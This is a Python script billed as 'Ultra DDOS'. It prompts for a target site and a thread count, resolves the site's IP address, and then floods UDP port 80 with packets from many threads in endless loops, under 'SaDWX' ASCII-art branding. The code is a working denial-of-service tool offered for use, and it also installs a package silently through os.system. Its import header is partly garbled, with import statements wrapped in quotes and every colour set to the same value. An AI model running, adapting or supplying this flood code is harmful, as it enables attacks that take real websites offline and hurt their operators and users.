# Imports
import socket
"import wget"
from itertools import count
import shutil
"import requests as r, os, threading, random"
"import shutup; shutup.please() # pip3 install shutup"
from threading import Thread
import cmd
"from pystyle import Colors, Colorate, Center"
"import colorama"
"import requests"
"import random"
import string
import sys
"import pcpy"
import time
import os
import urllib.request
import re
import threading
from os import system, name, mkdir,rmdir
"import httpx"
"import undetected_chromedriver as webdriver"
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests
os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

#Ultra DDOS

#kosnane editor code ro gayidam
import socket
import time
import sys
import os
import _thread
from colorama import Fore, Back, Style
os.system ('pip3 install colorama')
os.system ('clear')
cyan = Fore.CYAN
red = Fore.RED
white = Fore.WHITE
magenta = Fore.MAGENTA
lightgreen = Fore.LIGHTGREEN_EX
print(lightgreen+'''
    OboOOOOOOOOOOOOO.OOoOOoOOOOOo.    OOOo.oOOOOOoOOOOOOOOOOOOO0   
    OOOOoOOOOOOOOOOOOOOOOOOOOOOOOo.   `"OOOOOOOOOOOOOOOOOOOOOO00   
    `OOOOO     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO0    `OOOOo'''+white+'''    
    .OOOO"            `OOOOOOOOOOOOOOOOOOOOOOOOOO"            `OO   
   OOOOO                 "OOOOOOOOOOOOOOOO"`                oOO     
   oOOOOOba.               .adOOOOOOOOOOba             .adOOOOo.    
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOOOOOOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  "OOOOOOOOOOOOO.OOOOOOOOOOOOOO'''+red+'''  
 "OOOO"       "YOoOOOOMOIONODOO"`      "OOROAOPOEOOOoOY"     "OOO"  
    Y           "OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?"        :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                  0o  OOOOOOOOOOOOOOOOOOOOOOOOOO:
                      `$"  `OOOO `O"Y " `OOOO  o             .
    .                  .     OP"          : o     .
'''+lightgreen+'''
-------------------------------------------------------------------
××××××××××'''+magenta+'''SaDWX'''+lightgreen+'''××××××××××××××××××
-------------------------------------------------------------------
''')
site = input(cyan+'Enter your site url'+red+' #==>>>')
thread_count = input(lightgreen+'Enter your thread'+red+' #==>>>')
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = '</SaDWX/>'
print(red+'UDP target'+lightgreen+'IP:', ip)
print(red+'UDP target'+lightgreen+'port:', UDP_PORT)
time.sleep(1)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(magenta+'packet Sent1'+cyan+'! :)')
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
